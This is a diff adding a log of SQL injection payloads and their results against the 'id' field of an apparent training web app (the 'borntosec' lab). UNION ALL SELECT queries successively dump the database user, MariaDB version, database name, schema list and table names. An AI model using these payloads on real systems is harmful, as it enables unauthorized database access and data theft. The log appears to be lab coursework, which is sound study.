@@ -1,0 +1,37 @@
+Payload: 1 UNION ALL SELECT USER(),NULL
+Vulnerable field: id
+User: ID: 1 UNION ALL SELECT USER(),NULL  First name: one Surname : me
+User: ID: 1 UNION ALL SELECT USER(),NULL  First name: borntosec@localhost Surname :
+Payload: 1 UNION ALL SELECT USER(),NULL
+Vulnerable field: id
+Payload: 1 UNION ALL SELECT USER(),NULL
+Vulnerable field: id
+Payload: 1 UNION ALL SELECT @@VERSION,NULL
+Vulnerable field: id
+Version: ID: 1 UNION ALL SELECT @@VERSION,NULL  First name: one Surname : me
+Version: ID: 1 UNION ALL SELECT @@VERSION,NULL  First name: 5.5.64-MariaDB-1ubuntu0.14.04.1 Surname :
+Payload: 1 UNION ALL SELECT @@VERSION,NULL
+Vulnerable field: id
+Payload: 1 UNION ALL SELECT @@VERSION,NULL
+Vulnerable field: id
+Payload: 1 UNION ALL SELECT DATABASE(), USER()
+Vulnerable field: id
+Database: ID: 1 UNION ALL SELECT DATABASE(), USER()  First name: one Surname : me
+Database: ID: 1 UNION ALL SELECT DATABASE(), USER()  First name: Member_Sql_Injection Surname : borntosec@localhost
+Payload: 1 UNION ALL SELECT DATABASE(), @@VERSION
+Vulnerable field: id
+Database: ID: 1 UNION ALL SELECT DATABASE(), @@VERSION  First name: one Surname : me
+Database: ID: 1 UNION ALL SELECT DATABASE(), @@VERSION  First name: Member_Sql_Injection Surname : 5.5.64-MariaDB-1ubuntu0.14.04.1
+Payload: 1 UNION ALL SELECT schema_name, NULL from information_schema.schemata
+Vulnerable field: id
+Database: ID: 1 UNION ALL SELECT schema_name, NULL from information_schema.schemata  First name: one Surname : me
+Database: ID: 1 UNION ALL SELECT schema_name, NULL from information_schema.schemata  First name: information_schema Surname :
+Database: ID: 1 UNION ALL SELECT schema_name, NULL from information_schema.schemata  First name: Member_Brute_Force Surname :
+Database: ID: 1 UNION ALL SELECT schema_name, NULL from information_schema.schemata  First name: Member_Sql_Injection Surname :
+Database: ID: 1 UNION ALL SELECT schema_name, NULL from information_schema.schemata  First name: Member_guestbook Surname :
+Database: ID: 1 UNION ALL SELECT schema_name, NULL from information_schema.schemata  First name: Member_images Surname :
+Database: ID: 1 UNION ALL SELECT schema_name, NULL from information_schema.schemata  First name: Member_survey Surname :
+Payload: 1 UNION ALL SELECT table_name, NULL from information_schema.tables where table_schema=database()
+Vulnerable field: id
+Database: ID: 1 UNION ALL SELECT table_name, NULL from information_schema.tables where table_schema=database()  First name: one Surname : me
+Database: ID: 1 UNION ALL SELECT table_name, NULL from information_schema.tables where table_schema=database()  First name: users Surname :
